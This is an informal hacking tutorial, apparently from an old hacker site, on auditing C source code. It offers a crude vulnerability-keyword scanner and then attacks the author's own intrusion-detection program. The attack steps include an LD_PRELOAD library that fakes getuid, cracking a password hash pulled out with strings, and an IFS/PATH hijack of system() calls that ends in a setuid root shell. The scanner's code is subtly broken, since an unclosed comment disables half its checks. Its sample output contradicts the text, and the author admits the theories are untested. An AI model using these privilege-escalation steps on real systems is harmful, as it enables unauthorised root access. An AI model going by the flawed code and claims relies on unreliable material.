@@ -1,0 +1,387 @@
+--------------------------------------------------------
+
+		Finding Vulnerabilitites		
+                
+		    by bob@dtors.net
+
+-------------------------------------------------------
+
+Introduction
+------------
+
+In this paper im going to explain how to go about
+auditing source code, to see if the application can be
+exploited. Which will then lead me to walk you through 
+how to hack the IDS that I coded for my website.
+
+This paper does require you to have an understanding 
+with the C programming language, in order for you to
+fully understand.
+
+Exploits are created through human error. Sloppy
+programming can lead to system compromisation.
+
+H >o< l e s
+-----------
+
+Im going to explain the methodology you will regularly want
+to use for finding vulnerabilities in a systematic way by 
+looking at the code.
+
+Method [1]
+----------
+
+In this method you go from the start of the code to the end,
+look for all sources of external user input. Write them down
+as you go along, and then you can begin your audit from each
+of these points. Another good thing to look for while auditing
+code, is whether there is bounds checking in place. You need to
+cover all the code that branches from the external input,
+and functions that may be called upon.
+
+Method [2]
+----------
+
+This method starts at the main() function. You follow the code how it
+will be executed, your job is to act like strace, and follow exactly 
+how its going to be working.
+
+Note down functions() that take user input, see whether bounds checking 
+is in place, whether it is using the proper arguments, which might be 
+vulnerable to a format string attacks.
+
+Another good thing to look for is whether the program drops privileges, or
+if it opens files in a insecure manner, or any system functions.  The program
+should also check the reutrn values, from functions.
+
+Things to look out for in particular
+------------------------------------
+
+When your auditng your source code, there are a few things u might want to watch
+out for. Ill list a few with the problems:
+
+strcpy() - Doesnt use bounds checking, meaning we can copy a value
+           from one array larger then the target array.
+
+*gets() - Once again insufficent bounds checking.
+
+setenv/getenv() - We can manipulate this to cause a buffer overflow.
+
+*scanf() - This one if used incorrectly is also vulnerable.
+
+system() - DONT USE THIS....this can be manipulated so easy, you
+           see this in some code, smile!
+
+printf() - If used incorrectly this can be vulnerable
+           to a format string attack.
+
+getuid() - This can be manipulated, to make the program think you are root.
+
+There are so many more, im just pointing out the most common ones.
+Most of the time you will see that these are used correctly, but
+watch out for things like this: 
+
+strcpy(VAR1, argv[1]);
+
+scanf("%s", &VAR1);
+
+fscanf(fp, "%s", WORD);
+
+strcpy(buffer, (char *)getenv("TERM"));
+
+printf(VAR1);
+
+snprintf (buf, sizeof(buf)-1, argv[1]); 
+
+So many more!!!!!!!!!!!!!!
+
+What i did was to make a program to open(), read() and then scan for
+some common vulnerabilities. Saves doing it via metod 1/2...and can also
+be easily updated with more strings to scan for.
+
+Heres a look at the code, that would do this:
+
+/* SrcSec.c
+ *
+ * SrcSec checks C source code for
+ * insecure programming, and will notify
+ * the user of the implications.
+ *
+ * by bob [www.dtors.net]
+ */
+
+#include <stdio.h>
+
+int main(int argc, char * argv[])
+{
+FILE *fp;
+char word[100];
+int c;
+
+if(argc < 2) {
+printf("\nSrcSec by bob [www.dtors.net]\n");
+printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
+printf("Usage: %s <src file>\n\n", argv[0]);
+exit(0);
+}
+if ((strlen(argv[1]))<1){
+	puts("Error: We need a valid file name?!");
+	sleep(1); exit(1);}
+
+if ((fp=fopen(argv[1], "r+"))==NULL){
+	printf("Error: Cant read/find source file!");
+	sleep(1); exit(1);}
+
+   puts("Examining Source Code, Please Wait....\n");
+   sleep(3);
+   fp = fopen(argv[1], "r");
+      
+   do 
+   {
+      
+     c = fscanf(fp, "%s\n", word); /* get one word from file    */
+     
+/* buffer ovferlows /*
+
+if((strstr(word,"strcpy"))!=NULL)
+printf("strcpy() found at position: %d, potential buffer overflow attack!\n",ftell(fp));
+      
+if((strstr(word,"gets"))!=NULL)
+printf("gets() found at position: %d, potential buffer overflow attack!\n",ftell(fp));
+
+if((strstr(word,"fgets"))!=NULL)
+printf("fgets() found at position: %d, potential buffer overflow attack!\n",ftell(fp));
+
+if((strstr(word,"setenv"))!=NULL)
+printf("setenv() found at position: %d, potential buffer overflow attack!\n",ftell(fp));
+
+if((strstr(word,"getenv"))!=NULL)
+printf("getenv() found at position: %d, potential buffer overlow attack!\n",ftell(fp));
+
+if((strstr(word,"scanf"))!=NULL)
+printf("scanf() found at position: %d, potential buffer overflow attack!\n",ftell(fp));
+
+if((strstr(word,"sscanf"))!=NULL)
+printf("sscanf() found at position: %d, potential buffer overflow attack!\n",ftell(fp));
+
+if((strstr(word,"fscanf"))!=NULL)
+printf("fscanf() found at position: %d, potential buffer overflow attack!\n",ftell(fp));
+
+if((strstr(word,"strcat"))!=NULL)
+printf("strcat() found at position: %d, potential buffer overflow attack!\n",ftell(fp));
+
+/* format strings */
+if((strstr(word,"fprintf"))!=NULL)
+printf("fprintf() found at position: %d, potential formatstring attack!?\n",ftell(fp));
+
+if((strstr(word,"sprintf"))!=NULL)
+printf("sprintf() found at position: %d, potential formatstring attack!?\n",ftell(fp));
+
+if((strstr(word,"snprintf"))!=NULL)
+printf("snprintf() found at position: %d, potential formatstring attack!?\n",ftell(fp));
+
+if((strstr(word,"system"))!=NULL)
+printf("system() found at position: %d, potential formatstring attack!?\n",ftell(fp));
+
+if((strstr(word,"syslog"))!=NULL)
+printf("syslog() found at position: %d, potential formatstring attack!?\n",ftell(fp));
+
+if((strstr(word,"vsprintf"))!=NULL)
+printf("vsprintf() found at position: %d, potential formatstring attack!?\n",ftell(fp));
+
+if((strstr(word,"vsnprintf"))!=NULL)
+printf("vsprintf() found at position: %d, potential formatstring attack!?\n",ftell(fp));
+
+if((strstr(word,"popen"))!=NULL)
+printf("popen() found at position: %d, potential formatstring attack!?\n",ftell(fp));
+
+} while (c != EOF);                /* repeat until EOF          */
+
+   fclose(fp);
+   puts("\n...Scan Completed.");
+   printf("\n\nThis Vulnerability scan was very generalised, so\n");
+   printf("some could be false alarms, and others may be missed.\n");
+   printf("SrcSec.c by bob@dtors.net\n\n");
+
+   return 0;
+}
+
+
+Ill show you an example of this working on an IDS that I
+coded a few weeks back.
+
+[bob@dtors.net bob]$ gcc srcsec.c -o srcsec
+[bob@dtors.net bob]$ ./srcsec S.H.I.T.c
+
+Examining Source Code, Please Wait....
+
+...Scan Completed.
+
+This Vulnerability scan was very generalised, so
+some could be false alarms, and others may be missed.
+SrcSec.c by bob@dtors.net
+
+[bob@dtors.net bob]$ 
+
+Now we found some common points that we can possibly exploit,
+we take a closer look at the code ourselves.
+
+If you want to look at the code yourself, you can get it at
+http://blaat.dtors.net/S.H.I.T.tar.gz
+
+I will paste here some snippets of possible ways we could
+exploit S.H.I.T. 
+
+Ok the first one im looking at, starts in the main function.
+
+if (getuid() != 0){
+puts("You must be root!");
+exit(1);
+}
+
+Now as i said earlier, we can trick this into thinking we are root, 
+even when we are not. Here is a quick example of how we might go about
+doing this:
+
+cat >bob.c <<__BLAAT__
+
+int getuid() { return 0; }
+int geteuid() { return 0; }
+int getgid() { return 0; }
+int getegid() { return 0; }
+__BLAAT__
+gcc -shared bob.c -o bob.so
+LD_PRELOAD=./bob.so sh
+
+To stop this from occuring, if we compile S.H.I.T, with
+the -static flag, it will not be affected by this little hack.
+
+The next thing I notice in the main function
+is that once compiled, the binary will require
+password authentication to run. The password is stored
+in enCRYPTed form, in the smells.h file. 
+
+The Admin that runs S.H.I.T on his server, will change
+the default password which is defined in smells.h:
+
+#define PWD "uXO1k5bPFzFhk"            //YOUR password here, create with htpasswd.
+
+
+Thing here is that this type of password enCRYPTion is not very
+secure, and to get the password the victim used is simple.
+Once it had been compiled a strings command would show us the 
+encrypted password, we then crack this password, with
+john the ripper. Which then gives us access to this IDS!!
+
+[bob@dtors.net bob]$ strings s.h.i.t
+..............
+
+[0;0m
+ Safe Homepage Intrusion Technology.
+uXO1k5bPFzFhk <<<password we will crack!
+You must be root!
+lpd -c -p 515 <<process mask
+Password: 
+Your S.H.I.T stinks!
+
+...................
+
+So lets imagine that we are able to get the password,
+and we have cracked it, so we go a step further...
+
+while(1)
+		{
+		snprintf(cmd, sizeof(cmd), "%s %s >%s", MD5, INDEX, TMP);
+		system(cmd);
+//get md5 checksum of index file.
+		snprintf(cmd,sizeof(cmd), "%s %s >%s", MD5, HIDEME, TMP2);
+		system(cmd);
+//get md5 checksum of backup file
+            snprintf(cmd,sizeof(cmd), "%s %s %s > %s", DIFF, TMP, TMP2, TMP3);
+		system(cmd);
+//check to see if they are different
+
+Ouch what was i thinking!?!
+
+As you can see here, we put the commands we want to execute into
+"cmd". Then we execute a SYSTEM() which is VERY unsafe! Here is 
+our main point of exploitation.
+
+We can make S.H.I.T execute OUR program instead of the one
+it is designed to run.
+
+For example:
+Lets say for a second the command that is stored in cmd is:
+
+/usr/bin/md5sum /www/htdocs/index.php /tmp/index.php
+
+We can exploit this similar to my example below:
+
+export IFS=/
+
+That will ignore / 
+
+PATH = /tmp
+
+sets the PATH env to /tmp only
+
+/bin/cp /bin/sh /tmp/usr
+
+Now when we run S.H.I.T, it will ask for the password, we put
+the one we cracked earlier, then the IDS will move onto the system()
+calls.
+
+Now it will try and execute usr bin md5sum....... because we
+set it to ignore the /'s.
+Also we set our PATH to /tmp so its going to execute files from there 
+only which will result in it running /tmp/usr which will execute us a 
+shell.
+
+Wollah....we dont necessarily have to make it execute a shell, we
+can make it execute anything we want....for example:
+
+int main{system("/bin/chmod 4775 /bin/sh");execl("/bin/sh","sh -i",0);}
+
+We compile that and rename it to usr...we have ourself a rootshell :P
+
+Conclusion
+----------
+
+I have not had time to test all my theories that I have shared with you 
+here. But logic says they are right. I have covered some very old points of
+exploitation, plus some ones that are still commonly found.
+
+S.H.I.T if used correctly is not vulnerable to the above suggestions.
+For example running strings, on a program that is not owned by the same
+uid and gid, is not possible if the CORRECT file permission are set.
+
+Also if you were to encrypt the binary it would proove better protection.
+One more thing, if you was to run it under the uid/gid of nobody, which
+is the same as your website should run under....root compromise is not
+possible.
+
+Buffer Overflows are becoming surely but slowly the thing of the past. But
+as long as people still code, and others like you and me audit that code
+they will still exist. I did mention other such things as format strings,
+which are also not so much of a threat, but they are good to know of.
+
+A fairly recent type of overflow is the Integer Overflow which is when a
+integer is declared as signed, and you can overflow it so it becomes negative. 
+You can read more on Integer Overflows, on the links section of my site.
+
+Thats about it, 
+
+Regardos
+
+bob
+
+Email: bob@dtors.net
+Website: www.dtors.net
+Homepage: blaat.dtors.net
+
+
+
+
+
+
+
